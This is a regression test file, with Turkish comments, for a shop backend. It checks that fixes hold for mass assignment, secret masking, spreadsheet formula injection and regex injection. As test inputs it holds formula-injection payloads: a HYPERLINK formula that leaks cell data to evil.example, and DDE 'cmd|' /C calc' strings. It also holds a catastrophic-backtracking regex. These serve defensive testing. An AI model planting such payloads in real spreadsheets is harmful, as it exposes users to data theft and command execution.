"""INJ-01 — enjeksiyon / veri sızıntısı avı (2026-10) regresyon testleri.

1. Mass assignment: POST /api/settings gövdesindeki `id` ana ayar belgesini YENİDEN ANAHTARLAYAMAZ
   (settings.site yetkili personel "main" belgesini id="iyzico" yapıp kendi iyzico API anahtarıyla
   sahte ödeme ayarı belgesi oluşturamaz — integrations.iyzico yetkisinin baypası).
2. Mass assignment: POST /api/admin/mobile/config yalnız feature_flags / branding / support yazar;
   `id` ya da rastgele alanlar app_config belgesine (veya başka ayar belgesine) yazılmaz.
3. Veri sızıntısı: GET /api/integrations/{mp}/settings (integrations.* herhangi bir görüntüleme
   yetkisi) aynı id'li ayar belgesindeki access_token / app_secret / oauth_state gibi sırları
   maskeler (ör. "instagram" belgesi).
4. Hesap tablosu formül enjeksiyonu: müşteri/üçüncü taraf kaynaklı metin ("=HYPERLINK(...)") rapor,
   rapor asistanı, e-posta kampanya ve Amazon katalog Excel'lerinde FORMÜL hücresi olmaz.
"""
from __future__ import annotations

import io

import openpyxl
import pytest

from conftest import KvUsers, kv_run
from kv_harness import kv_insert, kv_find, kv_findall  # noqa: F401

EVIL = '=HYPERLINK("http://evil.example/?x="&A1,"Tikla")'


def _assert_no_formula(wb):
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for c in row:
                assert c.data_type != "f", f"{ws.title}!{c.coordinate} formül hücresi: {c.value!r}"
                if isinstance(c.value, str):
                    assert not c.value.startswith(("=", "@")), f"{ws.title}!{c.coordinate}: {c.value!r}"


# ───────────────────────────── 1. settings mass assignment ─────────────────────────────

def test_settings_update_cannot_rekey_main_document(kv_client, kv_users):
    kv_insert("settings", {"id": "main", "site_name": "Eski"})
    kv_insert("settings", {"id": "iyzico", "api_key": "legit-key", "api_secret": "legit-secret", "mode": "live"})
    staff = kv_users.staff(perms=["settings.site"])
    r = kv_client.post("/api/settings", headers=KvUsers.hdr(staff),
                       json={"id": "iyzico", "site_name": "Yeni", "api_key": "attacker-key",
                             "api_secret": "attacker-secret", "mode": "live"})
    assert r.status_code == 200, r.text
    main = kv_find("settings", {"id": "main"})
    assert main and main.get("site_name") == "Yeni"          # meşru düzenleme çalışır
    iyz = kv_findall("settings", {"id": "iyzico"})
    assert len(iyz) == 1 and iyz[0]["api_key"] == "legit-key"  # sahte iyzico belgesi YOK


def test_settings_insert_path_keeps_main_id(kv_client, kv_users):
    staff = kv_users.staff(perms=["settings.site"])
    r = kv_client.post("/api/settings", headers=KvUsers.hdr(staff),
                       json={"id": "iyzico", "site_name": "Ilk", "api_key": "attacker-key"})
    assert r.status_code == 200, r.text
    assert kv_find("settings", {"id": "main"}).get("site_name") == "Ilk"
    assert not kv_findall("settings", {"id": "iyzico"})


# ───────────────────────────── 2. mobile app config mass assignment ─────────────────────────────

def test_mobile_config_writes_only_whitelisted_sections(kv_client, kv_users):
    kv_insert("settings", {"id": "app_config", "feature_flags": {"live_support": False}})
    staff = kv_users.staff(perms=["integrations.edit"])
    r = kv_client.post("/api/admin/mobile/config", headers=KvUsers.hdr(staff),
                       json={"feature_flags": {"live_support": True}, "branding": {"primary_color": "#111111"},
                             "support": {"email": "destek@example.com"},
                             "id": "iyzico", "api_key": "attacker-key", "api_secret": "attacker-secret",
                             "updated_by": "sahte@example.com"})
    assert r.status_code == 200, r.text
    cfg = kv_find("settings", {"id": "app_config"})
    assert cfg and cfg["feature_flags"] == {"live_support": True}
    assert cfg["branding"] == {"primary_color": "#111111"} and cfg["support"]["email"] == "destek@example.com"
    assert "api_key" not in cfg and "api_secret" not in cfg
    assert cfg.get("updated_by") == staff["email"]
    assert not kv_findall("settings", {"id": "iyzico"})


def test_mobile_config_rejects_non_object_sections(kv_client, kv_users):
    staff = kv_users.staff(perms=["integrations.edit"])
    r = kv_client.post("/api/admin/mobile/config", headers=KvUsers.hdr(staff),
                       json={"feature_flags": "x", "support": {"email": "a@b.co"}})
    assert r.status_code == 400, r.text
    assert not kv_find("settings", {"id": "app_config"})


# ───────────────────────────── 3. generic settings GET masks secrets ─────────────────────────────

def test_generic_marketplace_settings_masks_all_secret_fields(kv_client, kv_users):
    kv_insert("settings", {"id": "instagram", "app_id": "12345", "access_token": "v1:gizli-token-sifreli",
                           "app_secret": "v1:gizli-app-secret", "refresh_token": "rt-gizli",
                           "oauth_state": "durum-anahtari", "oauth_state_at": "2026-10-05T00:00:00+00:00",
                           "ig_user_id": "999"})
    staff = kv_users.staff(perms=["integrations.trendyol"])  # integrations alanında HERHANGİ bir yetki
    r = kv_client.get("/api/integrations/instagram/settings", headers=KvUsers.hdr(staff))
    assert r.status_code == 200, r.text
    body = r.json()
    raw = r.text
    for secret in ("gizli-token-sifreli", "gizli-app-secret", "rt-gizli", "durum-anahtari"):
        assert secret not in raw, secret
    assert body.get("access_token") == "********" and body.get("app_secret") == "********"
    assert "oauth_state" not in body and "oauth_state_at" not in body
    assert body.get("app_id") == "12345"   # sır olmayan alanlar görünür kalır


# ───────────────────────────── 4. spreadsheet formula injection ─────────────────────────────

def test_report_table_export_neutralizes_formulas(kv_client, kv_users):
    staff = kv_users.staff(perms=["reports.sales"])
    r = kv_client.post("/api/admin/reports2/export-xlsx", headers=KvUsers.hdr(staff), json={
        "title": "Il Ilce",
        "columns": [{"k": "district", "l": "İlçe"}, {"k": "phone", "l": "Telefon"},
                    {"k": "note", "l": "Not"}, {"k": "revenue", "l": "Ciro", "type": "money"}],
        "rows": [{"district": EVIL, "phone": "+90 555 111 22 33", "note": "@SUM(1+1)*cmd|' /C calc'!A0",
                  "revenue": 125.5},
                 {"district": "Kadıköy", "phone": "-", "note": "-2+3", "revenue": "-10"}],
    })
    assert r.status_code == 200, r.text
    wb = openpyxl.load_workbook(io.BytesIO(r.content))
    _assert_no_formula(wb)
    ws = wb.active
    assert ws["A2"].value == "'" + EVIL                    # içerik korunur, yalnız metin olarak
    assert ws["B2"].value == "+90 555 111 22 33"           # saf telefon okunur kalır
    assert ws["D2"].value == 125.5 and ws["D3"].value == -10.0   # sayılar sayı kalır
    assert ws["A3"].value == "Kadıköy"


def test_report_assistant_excel_neutralizes_formulas():
    from routes.report_assistant import _xlsx
    content = _xlsx("t", [("İl ilçe", [{"district": EVIL, "count": 3, "reason": "+cmd|' /C calc'!A0"}])])
    wb = openpyxl.load_workbook(io.BytesIO(content))
    _assert_no_formula(wb)
    ws = wb.worksheets[0]
    assert ws["A2"].value == "'" + EVIL and ws["B2"].value == 3
    assert ws["C2"].value == "'+cmd|' /C calc'!A0"


def test_email_campaign_report_xlsx_neutralizes_formulas(kv_client, kv_users):
    kv_insert("email_campaigns", {"id": "camp-inj01", "subject": "Ekim", "status": "sent",
                                  "created_at": "2026-10-01T00:00:00+00:00"})
    evil_mail = '=hyperlink("http://evil.example","x")@a.co'
    kv_insert("email_campaign_sends", {"campaign_id": "camp-inj01", "email": evil_mail, "status": "sent",
                                       "at": "2026-10-01T10:00:00+00:00"})
    staff = kv_users.staff(perms=["tasarim.email"])
    r = kv_client.get("/api/admin/email-marketing/campaigns/camp-inj01/report.xlsx", headers=KvUsers.hdr(staff))
    assert r.status_code == 200, r.text
    wb = openpyxl.load_workbook(io.BytesIO(r.content))
    _assert_no_formula(wb)
    assert wb["Alıcılar"]["A2"].value == "'" + evil_mail


def test_amazon_catalog_report_xlsx_neutralizes_formulas(kv_client, kv_users):
    kv_insert("products", {"id": "p-inj01", "name": EVIL, "stock_code": "SK1", "is_active": True,
                           "variants": [{"barcode": "B1", "size": "M", "stock": 2}], "price": 100})
    kv_insert("amazon_sku_map", {"sku": "=1+1", "asin": "A1", "item_name": EVIL, "matched": False})
    staff = kv_users.staff(perms=["integrations.view"])
    r = kv_client.get("/api/amazon/spapi/catalog/report.xlsx", headers=KvUsers.hdr(staff))
    assert r.status_code == 200, r.text
    wb = openpyxl.load_workbook(io.BytesIO(r.content))
    _assert_no_formula(wb)


@pytest.mark.parametrize("value,expected", [
    ("=1+1", "'=1+1"), ("+cmd", "'+cmd"), ("-cmd|x", "'-cmd|x"), ("@SUM(A1)", "'@SUM(A1)"),
    ("\t=1", "'\t=1"), ("\r=1", "'\r=1"),
    ("+90 555 111 22 33", "+90 555 111 22 33"), ("-12,5", "-12,5"), ("-", "-"), ("Kadıköy", "Kadıköy"),
    ("", ""), (12, 12), (-3.5, -3.5), (None, None), (True, True),
])
def test_xlsx_safe_unit(value, expected):
    from utils.spreadsheet_safe import xlsx_safe
    assert xlsx_safe(value) == expected


# ───────────────────────────── 5. admin coupon search regex injection ─────────────────────────────

def test_coupon_search_is_literal_not_regex(kv_client, kv_users):
    kv_insert("coupons", {"id": "c-inj-1", "code": "YAZ50", "title": "Yaz", "is_active": True,
                          "created_at": "2026-10-01T00:00:00+00:00"})
    kv_insert("coupons", {"id": "c-inj-2", "code": "A.B(1)", "title": "Nokta", "is_active": True,
                          "created_at": "2026-10-02T00:00:00+00:00"})
    h = KvUsers.hdr(kv_users.staff(perms=["campaigns.view"]))
    # Joker: "Y.Z" eskiden YAZ50 ile eşleşiyordu; düz metin aramasında eşleşmez.
    r = kv_client.get("/api/admin/coupons", params={"search": "Y.Z"}, headers=h)
    assert r.status_code == 200, r.text
    assert r.json()["total"] == 0
    # Regex meta karakterli gerçek kod düz metin olarak bulunur; bozuk desen 500 vermez.
    r = kv_client.get("/api/admin/coupons", params={"search": "A.B(1)"}, headers=h)
    assert r.status_code == 200, r.text
    assert [c["id"] for c in r.json()["items"]] == ["c-inj-2"]
    r = kv_client.get("/api/admin/coupons", params={"search": "(a+)+$("}, headers=h)
    assert r.status_code == 200, r.text
